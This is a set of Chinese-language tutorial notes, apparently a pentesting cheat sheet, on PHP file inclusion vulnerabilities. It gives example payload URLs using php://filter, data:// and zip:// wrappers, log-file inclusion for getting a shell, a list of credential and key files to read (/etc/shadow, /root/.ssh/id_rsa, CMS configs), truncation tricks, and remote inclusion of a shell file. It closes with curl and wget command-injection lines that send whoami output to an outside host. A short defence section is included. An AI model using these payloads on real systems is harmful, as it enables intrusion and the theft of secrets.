    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">文件包含</span><br><span class="line">include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行</span><br><span class="line">require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本include_once()和require_once()：若文件中代码已被包含则不会再次包含</span><br><span class="line"></span><br><span class="line">文件包含漏洞，需要引入上传的文件到网站目录，或是服务器内部的文件，而且是权限是可读，才能引入</span><br><span class="line">进来，或远程包含进来，但是需要条件。</span><br><span class="line"></span><br><span class="line">/etc/passwd</span><br><span class="line"></span><br><span class="line">利用</span><br><span class="line">	文件包含图片</span><br><span class="line"></span><br><span class="line">	包含日志文件getshell</span><br><span class="line"></span><br><span class="line">		在linux下日志文件权限默认是root而php的权限是www-data一般情况下都是读取不了，如果是windows</span><br><span class="line">环境下是可以权限是允许的。</span><br><span class="line"></span><br><span class="line">		/var/log/apache2/access.log</span><br><span class="line"></span><br><span class="line">		/var/log/apache2/error.log</span><br><span class="line"></span><br><span class="line">phpinfo文件包含临时文件</span><br><span class="line"></span><br><span class="line">伪协议</span><br><span class="line">	file://—访问本地文件系统</span><br><span class="line">http://—访问HTTP(s)网址</span><br><span class="line">ftp://—访问FTP(s)URLs</span><br><span class="line">php://—访问各个输入/输出流（I/Ostreams）</span><br><span class="line">zlib://—压缩流</span><br><span class="line">data://—数据（RFC2397）</span><br><span class="line">glob://—查找匹配的文件路径模式</span><br><span class="line">phar://—PHP归档</span><br><span class="line">ssh2://—SecureShell2</span><br><span class="line">rar://—RAR</span><br><span class="line">ogg://—音频流</span><br><span class="line">expect://—处理交互式的流</span><br><span class="line"></span><br><span class="line">php.ini参数设置</span><br><span class="line"></span><br><span class="line">	allow_url_fopen:默认值是ON。允许url里的封装协议访问文件；</span><br><span class="line"></span><br><span class="line">	allow_url_include:默认值是OFF。不允许包含url里的封装协议包含文件</span><br><span class="line"></span><br><span class="line">php://input </span><br><span class="line"></span><br><span class="line">	当enctype=&quot;multipart/form-data&quot;，php://input是无效的。</span><br><span class="line"></span><br><span class="line">	php.ini条件是allow_url_fopen=ON  allow_url_include=ON</span><br><span class="line"></span><br><span class="line">	设置请求为post请求在正文输入php代码&lt;?phpphpinfo();?&gt;提交即可允许</span><br><span class="line"></span><br><span class="line">file://访问本地文件</span><br><span class="line"></span><br><span class="line">	file:///etc/passwd</span><br><span class="line"></span><br><span class="line">php://</span><br><span class="line"></span><br><span class="line">	使用协议读取文件源码</span><br><span class="line">php://filter/read=convert.base64-encode/resource=/etc/passwd</span><br><span class="line"></span><br><span class="line">phar://、zip://、bzip2://、zlib://</span><br><span class="line"></span><br><span class="line">	1、zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）</span><br><span class="line"></span><br><span class="line">		http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.tx</span><br><span class="line">t</span><br><span class="line"></span><br><span class="line">data://协议</span><br><span class="line"></span><br><span class="line">	1、data://text/plain,</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">	2、data://text/plain;base64,</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br><span class="line"></span><br><span class="line">文件包含常用路</span><br><span class="line"></span><br><span class="line">	包含日志文件getshell</span><br><span class="line">/usr/local/apache2/logs/access_log</span><br><span class="line">/logs/access_log</span><br><span class="line">/etc/httpd/logs/access_log</span><br><span class="line">/var/log/httpd/access_log</span><br><span class="line"></span><br><span class="line">	读取网站配置文件</span><br><span class="line">dedecms数据库配置文件data/common.inc.php,</span><br><span class="line">discuz全局配置文件config/config_global.php,</span><br><span class="line">phpcms配置文件caches/configs/database.php</span><br><span class="line">phpwind配置文件conf/database.php</span><br><span class="line">wordpress配置文件wp-config.php</span><br><span class="line"></span><br><span class="line">		包含系统配置文件</span><br><span class="line">windows</span><br><span class="line">C:/boot.ini//查看系统版本</span><br><span class="line">C:/Windows/System32/inetsrv/MetaBase.xml//IIS配置文件C:/Windows/repairsam//存储系统初次安装的密码</span><br><span class="line">C:/ProgramFiles/mysql/my.ini//Mysql配置</span><br><span class="line">C:/ProgramFiles/mysql/data/mysql/user.MYD//Mysqlroot</span><br><span class="line">C:/Windows/php.ini//php配置信息</span><br><span class="line">C:/Windows/my.ini//Mysql配置信息</span><br><span class="line"></span><br><span class="line">			linux</span><br><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_ras.keystore</span><br><span class="line">/root/.ssh/known_hosts</span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/shadow</span><br><span class="line">/etc/my.cnf</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/root/.bash_history</span><br><span class="line">/root/.mysql_history</span><br><span class="line">/proc/self/fd/fd[0-9]*(文件标识符)</span><br><span class="line">/proc/mounts</span><br><span class="line">/porc/config.gz</span><br><span class="line"></span><br><span class="line">当allow_url_fopen=On</span><br><span class="line">allow_url_include=ON两个条件同时为On允许远程包含文件。</span><br><span class="line"></span><br><span class="line">	http://192.168.0.103/lfi.php?file=http://192.168.0.103/shell.txt</span><br><span class="line"></span><br><span class="line">文件包含截断攻击</span><br><span class="line"></span><br><span class="line">	文件包含截断攻击，在php版本小于5.3.4允许使用%00截断</span><br><span class="line"></span><br><span class="line">		如果gpc为On时，%00会被转以成\0截断会失败</span><br><span class="line"></span><br><span class="line">超长文件包含截断</span><br><span class="line"></span><br><span class="line">	这个合适于win32可以使用\.进行截断和</span><br><span class="line"></span><br><span class="line">	(php版本小于5.2.8可以成功，linux需要文件名长于4096，windows需要长于256)</span><br><span class="line"></span><br><span class="line">	点截断</span><br><span class="line">http://include.moonteam.com/file02.php?file=x.jpg............................................</span><br><span class="line">.............................................................................................</span><br><span class="line"></span><br><span class="line">	/.截断</span><br><span class="line">http://include.moonteam.com/file02.php?file=x.jpg%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%</span><br><span class="line">2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f</span><br><span class="line"></span><br><span class="line">远程包含截断</span><br><span class="line"></span><br><span class="line">	allow_url_fopen=On</span><br><span class="line">allow_url_include=On</span><br><span class="line"></span><br><span class="line">	#》%23  ？》%3f  00 &gt;%00</span><br><span class="line">文件包含漏洞防御方案</span><br><span class="line"></span><br><span class="line">	.路径限制：限制被包含的文件只能在某一文件内，一定要禁止目录跳转字符，如：&quot;../&quot;；</span><br><span class="line"></span><br><span class="line">	.严格判断包含中的参数是否外部可控，因为文件包含漏洞利用成功与否的关键点就在于被包含的文件是否可被外部控制；</span><br><span class="line"></span><br><span class="line">	.包含文件验证：验证被包含的文件是否是白名单中的一员；</span><br><span class="line"></span><br><span class="line">	设置allow_url_include为Off</span><br><span class="line"></span><br><span class="line">利用日志测试无回显</span><br><span class="line">	ping -c 4 ||curl http://192.168.0.133/?`whoami`</span><br><span class="line">使用 wget 命令</span><br><span class="line">ping -c 4 ||wget http://192.168.0.133/?`whoami`</span><br></pre></td></tr></table></figure>
